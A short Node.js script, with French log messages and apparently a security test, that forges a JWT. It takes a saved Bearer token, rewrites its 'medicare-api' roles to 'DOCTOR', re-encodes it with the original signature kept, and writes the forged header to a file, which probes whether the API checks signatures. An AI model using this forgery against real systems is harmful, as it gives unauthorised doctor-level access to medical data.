const fs = require("fs");
const path = require("path");

const src = path.join(__dirname, "auth-header.local");
const header = fs.readFileSync(src, "utf8").trim();
const token = header.replace("Authorization: Bearer ", "");
const [h, p, s] = token.split(".");

const payload = JSON.parse(Buffer.from(p, "base64url").toString("utf8"));
console.log("Roles d'origine :", JSON.stringify(payload.resource_access["medicare-api"].roles));
payload.resource_access["medicare-api"].roles = ["DOCTOR"];
console.log("Roles falsifies :", JSON.stringify(payload.resource_access["medicare-api"].roles));

const forged = [h, Buffer.from(JSON.stringify(payload)).toString("base64url"), s].join(".");
fs.writeFileSync(path.join(__dirname, "forged-header.local"), "Authorization: Bearer " + forged + "\n");
console.log("Token falsifie ecrit dans tests/forged-header.local (signature d'origine conservee).");